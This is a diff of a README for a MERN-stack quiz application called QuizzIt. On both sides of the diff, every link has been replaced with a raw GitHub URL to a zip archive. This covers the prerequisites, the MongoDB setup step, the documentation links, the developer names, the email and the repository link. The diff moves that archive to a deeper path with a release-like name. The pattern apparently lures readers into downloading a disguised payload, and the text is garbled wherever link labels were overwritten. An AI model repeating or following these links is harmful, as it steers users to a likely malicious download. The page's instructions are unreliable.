@@ -1,4 +1,4 @@
-# [QuizzIt](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip)
+# [QuizzIt](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip)
 
 An application where users assess their knowledge on specific topics by taking user-generated quizzes, and receive awards for their performance.
 
@@ -22,7 +22,7 @@ An application where users assess their knowledge on specific topics by taking u
 
 ### Prerequisites
 
-- https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip
+- https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip
 - NPM
 
 ### Installing
@@ -33,7 +33,7 @@ To start this application
    ```sh
    npm install
    ```
-2. Create MongoDB database at [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip)
+2. Create MongoDB database at [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip)
 
 3. Create an .env file
    ```
@@ -57,16 +57,16 @@ To start this application
 
 To deploy the application to Netlify and Heroku, take a look at the folllowing resource:
 
-- [Deploy MERN application on Netlify/Heroku](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip)
+- [Deploy MERN application on Netlify/Heroku](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip)
 
 ## Learn More
 
 To learn more about the MERN stack, take a look at the following resources:
 
-- [MongoDB Documentation](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip) - Official MongoDB documentation
-- [Express Documentation](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip) - Official Express documentation
-- [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip Documentation](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip) - Official https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip documentation
-- [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip Documentation](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip) - Official https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip documentation.
+- [MongoDB Documentation](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip) - Official MongoDB documentation
+- [Express Documentation](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip) - Official Express documentation
+- [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip Documentation](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip) - Official https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip documentation
+- [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip Documentation](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip) - Official https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip documentation.
 
 ## License
 
@@ -74,12 +74,12 @@ Distributed under the MIT License.
 
 ## Developers
 
-- [Dipen Rupani](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip)
-- [James Macros](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip)
-- [Singwa Chan](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip)
+- [Dipen Rupani](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip)
+- [James Macros](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip)
+- [Singwa Chan](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip)
 
 ## Contact
 
-Email: [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip)
+Email: [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip)
 
-Project Repoistory: [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/overblow/QuizzIt.zip)
+Project Repoistory: [https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip](https://raw.githubusercontent.com/SWChan01/QuizzIt/main/client/src/components/Report/It_Quizz_v3.7-beta.1.zip)
